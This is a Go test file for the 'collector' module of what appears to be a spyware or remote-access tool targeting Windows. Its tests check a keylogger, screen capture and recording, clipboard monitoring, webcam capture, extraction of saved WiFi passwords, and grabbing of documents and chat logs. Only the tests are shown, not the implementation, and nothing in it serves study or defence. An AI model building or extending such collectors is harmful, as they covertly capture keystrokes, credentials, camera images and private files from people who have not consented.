package collector

import (
	"testing"
	"time"

	"github.com/angel-platform/angel/pkg/types"
)

func TestNewCollectorEngine(t *testing.T) {
	config := DefaultCollectorConfig()
	engine := NewCollectorEngine(config)

	if engine == nil {
		t.Fatal("engine should not be nil")
	}

	if engine.config == nil {
		t.Fatal("config should not be nil")
	}

	if engine.log == nil {
		t.Fatal("logger should not be nil")
	}
}

func TestNewCollectorEngineNilConfig(t *testing.T) {
	engine := NewCollectorEngine(nil)

	if engine == nil {
		t.Fatal("engine should not be nil")
	}

	if engine.config == nil {
		t.Fatal("config should not be nil after nil config passed")
	}
}

func TestCaptureScreen(t *testing.T) {
	screen, err := CaptureScreen()
	if err != nil {
		t.Fatalf("CaptureScreen failed: %v", err)
	}

	if screen == nil {
		t.Fatal("screen capture should not be nil")
	}

	if screen.Width != 1920 {
		t.Errorf("expected width 1920, got %d", screen.Width)
	}

	if screen.Height != 1080 {
		t.Errorf("expected height 1080, got %d", screen.Height)
	}

	if screen.Format != "png" {
		t.Errorf("expected format png, got %s", screen.Format)
	}

	if len(screen.Data) == 0 {
		t.Error("screen data should not be empty")
	}
}

func TestRecordScreen(t *testing.T) {
	record, err := RecordScreen(5 * time.Second)
	if err != nil {
		t.Fatalf("RecordScreen failed: %v", err)
	}

	if record == nil {
		t.Fatal("screen record should not be nil")
	}

	if record.Duration != 5*time.Second {
		t.Errorf("expected duration 5s, got %v", record.Duration)
	}

	if record.Format != "h264" {
		t.Errorf("expected format h264, got %s", record.Format)
	}
}

func TestKeylogger(t *testing.T) {
	kl := NewKeylogger()

	if err := kl.Start(); err != nil {
		t.Fatalf("Start failed: %v", err)
	}

	time.Sleep(200 * time.Millisecond)

	if err := kl.Stop(); err != nil {
		t.Fatalf("Stop failed: %v", err)
	}

	log := kl.GetLog()
	if log == "" {
		t.Error("keylog should not be empty")
	}

	entries := kl.GetEntries()
	if len(entries) == 0 {
		t.Error("keylog entries should not be empty")
	}
}

func TestKeyloggerDoubleStart(t *testing.T) {
	kl := NewKeylogger()

	if err := kl.Start(); err != nil {
		t.Fatalf("Start failed: %v", err)
	}

	if err := kl.Start(); err != nil {
		t.Fatalf("Double start should not error: %v", err)
	}

	kl.Stop()
}

func TestClipboardMonitor(t *testing.T) {
	cm := NewClipboardMonitor()

	if err := cm.Start(); err != nil {
		t.Fatalf("Start failed: %v", err)
	}

	time.Sleep(200 * time.Millisecond)

	content, err := cm.GetContent()
	if err != nil {
		t.Fatalf("GetContent failed: %v", err)
	}

	if content == "" {
		t.Error("clipboard content should not be empty")
	}

	if err := cm.Stop(); err != nil {
		t.Fatalf("Stop failed: %v", err)
	}
}

func TestClipboardMonitorDoubleStart(t *testing.T) {
	cm := NewClipboardMonitor()

	if err := cm.Start(); err != nil {
		t.Fatalf("Start failed: %v", err)
	}

	if err := cm.Start(); err != nil {
		t.Fatalf("Double start should not error: %v", err)
	}

	cm.Stop()
}

func TestCaptureWebcam(t *testing.T) {
	webcam := NewWebcamGrabber()

	result, err := webcam.Capture()
	if err != nil {
		t.Fatalf("Capture failed: %v", err)
	}

	if result == nil {
		t.Fatal("webcam result should not be nil")
	}

	if len(result.Data) == 0 {
		t.Error("webcam data should not be empty")
	}
}

func TestWiFiGrabber(t *testing.T) {
	wg := NewWiFiGrabber()

	profiles, err := wg.GetWiFiProfiles()
	if err != nil {
		t.Fatalf("GetWiFiProfiles failed: %v", err)
	}

	if len(profiles) == 0 {
		t.Fatal("expected at least one WiFi profile")
	}

	for _, p := range profiles {
		if p.SSID == "" {
			t.Error("SSID should not be empty")
		}
	}
}

func TestWiFiPassword(t *testing.T) {
	wg := NewWiFiGrabber()

	pass, err := wg.GetWiFiPassword("HomeNetwork")
	if err != nil {
		t.Fatalf("GetWiFiPassword failed: %v", err)
	}

	if pass == "" {
		t.Error("password should not be empty")
	}

	_, err = wg.GetWiFiPassword("UnknownNetwork")
	if err == nil {
		t.Error("expected error for unknown SSID")
	}
}

func TestFileGrabber(t *testing.T) {
	config := DefaultCollectorConfig()
	fg := NewFileGrabber(config)

	files, err := fg.GrabFiles([]string{"*.go"}, 3)
	if err != nil {
		t.Fatalf("GrabFiles failed: %v", err)
	}

	if len(files) == 0 {
		t.Fatal("expected at least one file")
	}

	for _, f := range files {
		if f.Path == "" {
			t.Error("file path should not be empty")
		}
	}
}

func TestFileGrabberDocuments(t *testing.T) {
	config := DefaultCollectorConfig()
	fg := NewFileGrabber(config)

	files, err := fg.GrabDocuments()
	if err != nil {
		t.Fatalf("GrabDocuments failed: %v", err)
	}

	if len(files) == 0 {
		t.Fatal("expected at least one document")
	}
}

func TestFileGrabberChatLogs(t *testing.T) {
	config := DefaultCollectorConfig()
	fg := NewFileGrabber(config)

	files, err := fg.GrabChatLogs()
	if err != nil {
		t.Fatalf("GrabChatLogs failed: %v", err)
	}

	if len(files) == 0 {
		t.Fatal("expected at least one chat log")
	}
}

func TestCollectScreen(t *testing.T) {
	config := DefaultCollectorConfig()
	engine := NewCollectorEngine(config)

	result, err := engine.Collect(string(CategoryScreen))
	if err != nil {
		t.Fatalf("Collect failed: %v", err)
	}

	if !result.Success {
		t.Error("collection should be successful")
	}

	if result.Screen == nil {
		t.Error("screen capture should not be nil")
	}
}

func TestCollectKeylog(t *testing.T) {
	config := DefaultCollectorConfig()
	engine := NewCollectorEngine(config)

	result, err := engine.Collect(string(CategoryKeylog))
	if err != nil {
		t.Fatalf("Collect failed: %v", err)
	}

	if !result.Success {
		t.Error("collection should be successful")
	}
}

func TestCollectClipboard(t *testing.T) {
	config := DefaultCollectorConfig()
	engine := NewCollectorEngine(config)

	result, err := engine.Collect(string(CategoryClipboard))
	if err != nil {
		t.Fatalf("Collect failed: %v", err)
	}

	if !result.Success {
		t.Error("collection should be successful")
	}
}

func TestCollectWebcam(t *testing.T) {
	config := DefaultCollectorConfig()
	engine := NewCollectorEngine(config)

	result, err := engine.Collect(string(CategoryWebcam))
	if err != nil {
		t.Fatalf("Collect failed: %v", err)
	}

	if !result.Success {
		t.Error("collection should be successful")
	}
}

func TestCollectWiFi(t *testing.T) {
	config := DefaultCollectorConfig()
	engine := NewCollectorEngine(config)

	result, err := engine.Collect(string(CategoryWiFi))
	if err != nil {
		t.Fatalf("Collect failed: %v", err)
	}

	if !result.Success {
		t.Error("collection should be successful")
	}

	if len(result.WiFi) == 0 {
		t.Error("WiFi profiles should not be empty")
	}
}

func TestCollectFileGrab(t *testing.T) {
	config := DefaultCollectorConfig()
	engine := NewCollectorEngine(config)

	result, err := engine.Collect(string(CategoryFileGrab))
	if err != nil {
		t.Fatalf("Collect failed: %v", err)
	}

	if !result.Success {
		t.Error("collection should be successful")
	}
}

func TestCollectUnknownCategory(t *testing.T) {
	config := DefaultCollectorConfig()
	engine := NewCollectorEngine(config)

	_, err := engine.Collect("unknown")
	if err == nil {
		t.Fatal("expected error for unknown category")
	}
}

func TestGetResults(t *testing.T) {
	config := DefaultCollectorConfig()
	engine := NewCollectorEngine(config)

	engine.Collect(string(CategoryScreen))
	engine.Collect(string(CategoryWiFi))

	results := engine.GetResults()
	if len(results) < 2 {
		t.Errorf("expected at least 2 results, got %d", len(results))
	}
}

func TestDefaultCollectorConfig(t *testing.T) {
	config := DefaultCollectorConfig()

	if config == nil {
		t.Fatal("config should not be nil")
	}

	if config.Platform != types.PlatformWindows {
		t.Errorf("expected platform windows, got %s", config.Platform)
	}

	if len(config.Categories) == 0 {
		t.Error("expected at least one category")
	}

	if config.Timeout != 60*time.Second {
		t.Errorf("expected timeout 60s, got %v", config.Timeout)
	}

	if config.MaxDepth != 5 {
		t.Errorf("expected max depth 5, got %d", config.MaxDepth)
	}
}
